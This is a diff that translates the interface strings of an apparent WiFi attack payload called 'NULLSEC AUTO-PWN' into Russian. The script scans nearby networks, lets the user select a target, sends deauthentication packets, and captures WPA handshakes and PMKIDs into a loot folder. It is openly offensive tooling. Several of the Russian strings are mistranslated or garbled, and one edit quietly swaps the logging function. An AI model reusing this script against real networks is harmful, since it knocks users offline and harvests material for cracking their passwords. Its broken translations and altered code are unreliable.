@@ -16,13 +16,13 @@ log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; LOG "$1"; }
 # --- INTRODUCTION ---
 PROMPT "NULLSEC AUTO-PWN
 
-Automated WiFi attack chain:
+Автоматическая WiFi-цепочка атак:
 - Сканирование сети
-- Target selection  
-- Handshake capture
-- PMKID harvesting
+- Выбор цели  
+- Захват handshake
+- Посбор PMKID
 
-Press OK to start scan."
+Нажмите OK для начала сканирования."
 
 # --- DETECT INTERFACES ---
 MONITOR_IF=""
@@ -45,18 +45,18 @@ if [ -z "$MONITOR_IF" ]; then
 fi
 
 if [ -z "$MONITOR_IF" ] || [ ! -d "/sys/class/net/$MONITOR_IF" ]; then
-    ERROR_DIALOG "No monitor interface found!
+    ERROR_DIALOG "Нет интерфейса монитора!
 
-Enable monitor mode first:
+Включите режим монитор первым:
 airmon-ng start wlan1"
     exit 1
 fi
 
-log "Using interface: $MONITOR_IF"
+LOG "Использую интерфейс: $MONITOR_IF"
 
-# --- SCAN FOR СЕТЬS ---
+# --- Отсканирование СЕТЕЙ ---
 LOG "Сканирование сетей..."
-SPINNER_START "Scanning WiFi networks..."
+SPINNER_START "Отсканирование WiFi сетей..."
 
 rm -f /tmp/autopwn_scan*
 timeout 20 airodump-ng "$MONITOR_IF" -w /tmp/autopwn_scan --output-format csv 2>/dev/null &
@@ -92,13 +92,13 @@ done < /tmp/autopwn_scan-01.csv
 if [ $idx -eq 0 ]; then
     ERROR_DIALOG "Сети не найдены!
 
-Try moving to different location
-or check monitor interface."
+Попытайтесь подвинуть в другое место
+или проверьте монитор."
     exit 1
 fi
 
-# --- SELECT TARGET ---
-СЕТЬ_LIST="Найдено $idx networks:
+# --- ВЫБОР ЦЕЛИ ---
+СЕТЬ_LIST="Найдено $idx сетей:
 
 "
 for i in $(seq 0 $((idx-1))); do
@@ -106,7 +106,7 @@ for i in $(seq 0 $((idx-1))); do
 "
 done
 
-TARGET_NUM=$(NUMBER_PICKER "Select target (1-$idx):" 1)
+TARGET_NUM=$(NUMBER_PICKER "Выберите цель (1-$idx):" 1)
 case $? in
     $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;;
 esac
@@ -120,10 +120,10 @@ TARGET_BSSID="${BSSIDS[$TARGET_NUM]}"
 TARGET_CHANNEL="${CHANNELS[$TARGET_NUM]}"
 TARGET_ESSID="${ESSIDS[$TARGET_NUM]}"
 
-log "Selected target: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"
+log "Выбранная цель: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"
 
-# --- SELECT DURATION ---
-DURATION=$(NUMBER_PICKER "Capture duration (seconds):" 60)
+# --- ВЫБОР ДОЛГОВЕЧНОСТИ ---
+DURATION=$(NUMBER_PICKER "Время полвата (сек):" 60)
 case $? in
     $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;;
 esac
@@ -140,12 +140,12 @@ Channel: $TARGET_CHANNEL
 Select YES to attack.")
 
 if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
-    LOG "Attack cancelled"
+    LOG "Атака отменена"
     exit 0
 fi
 
-# --- EXECUTE ATTACK ---
-LOG "Starting attack on $TARGET_ESSID"
+# --- ВЫПОЛНЕНИЕ АТАКИ ---
+LOG "Начинаю атаку на $TARGET_ESSID"
 
 CAPTURE_FILE="$LOOT_DIR/handshakes/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"
 
@@ -160,7 +160,7 @@ CAPTURE_PID=$!
 sleep 3
 
 # Deauth bursts
-LOG "Sending deauth packets..."
+LOG "Отправляю пакеты деаутентификации..."
 DEAUTH_COUNT=0
 START=$(date +%s)
 
@@ -191,15 +191,15 @@ if [ -f "${CAPTURE_FILE}-01.cap" ]; then
     fi
 fi
 
-PROMPT "ATTACK COMPLETE
+PROMPT "АТАКА ЗАВЕРШЕНА
 
-Target: $TARGET_ESSID
-Deauths sent: $DEAUTH_COUNT
-Handshake: $HS_FOUND
+Цель: $TARGET_ESSID
+Отправлено деаутов: $DEAUTH_COUNT
+Хендшейк: $HS_FOUND
 
-Capture saved to:
+Капчур сохранён:
 $CAPTURE_FILE
 
-Press OK to exit."
+Нажмите OK для выхода."
 
-log "Attack complete. Handshake: $HS_FOUND"
+log "Атака завершена. Хендсейк: $HS_FOUND"
